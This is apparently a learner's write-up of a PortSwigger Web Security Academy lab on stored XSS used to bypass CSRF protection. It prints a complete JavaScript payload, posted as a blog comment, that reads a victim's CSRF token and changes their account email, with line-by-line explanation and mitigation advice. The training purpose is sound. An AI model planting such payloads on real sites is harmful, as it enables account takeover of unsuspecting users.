## Lab 24: Exploiting XSS to Bypass CSRF Defenses

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Scripting / Stored XSS / CSRF Token Theft / CSRF Bypass

### Lab Status

Solved

### Objective

The goal of this lab was to use a stored XSS vulnerability to steal a CSRF token and perform an unauthorized email change request on behalf of a victim user.

### Simple Explanation

This lab contained a stored XSS vulnerability in the blog comment functionality.

The account email change feature was protected by a CSRF token.

Normally, this token should prevent attackers from submitting forged requests.

However, because stored XSS was available, the injected JavaScript could run inside the victim's browser.

The script loaded the victim's `/my-account` page, extracted the CSRF token, and used it to send a valid email change request.

### Vulnerability Description

The blog comment functionality allowed stored JavaScript execution.

When the simulated victim viewed the comment, the JavaScript executed in the victim's authenticated session.

The payload sent a GET request to `/my-account`, extracted the CSRF token from the response, and then sent a POST request to `/my-account/change-email`.

This bypassed CSRF protection because the malicious request included a valid CSRF token taken from the victim's own account page.

### Key Concept

```text id="8y26q7"
Stored XSS → Read CSRF token → Send authenticated POST request → Change victim email
```

The vulnerability showed that XSS can defeat CSRF defenses because JavaScript running in the victim's browser can access same-origin pages and tokens.

### Payload Used

```html id="8e47ag"
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### Payload Explanation

The first request loads the victim's account page:

```javascript id="pqvvsd"
req.open('get','/my-account',true);
req.send();
```

Then the script extracts the CSRF token:

```javascript id="v2zzyf"
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
```

Finally, it sends a valid POST request to change the victim's email:

```javascript id="mgfwh8"
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
```

Because the script runs in the victim's browser, the victim's session cookie is automatically included with the requests.

### Steps Taken

Logged in using the provided credentials:

```text id="nfm7mn"
Username: wiener
Password: peter
```

Reviewed the email change functionality on the account page.

Confirmed that changing the email required a CSRF token.

Opened a blog post and submitted a comment containing the XSS payload.

Filled in the required comment fields and clicked Post Comment.

After posting the comment, the lab was solved immediately.

This happened because the simulated victim automatically viewed the posted comment, causing the stored script to execute in the victim's browser.

### Result

The lab was solved immediately after posting the malicious comment.

The stored XSS payload successfully extracted the CSRF token and used it to send a valid email change request.

### What I Learned

I learned that XSS can bypass CSRF protection by reading a valid CSRF token from the victim's own session.

### Security Impact

An attacker could use stored XSS to perform sensitive actions as another user, such as changing account details.

### Mitigation

Prevent XSS with proper output encoding and sanitization, and avoid relying on CSRF tokens alone when XSS is present.

### Tools Used

PortSwigger Web Security Academy

Web Browser

Browser Developer Tools
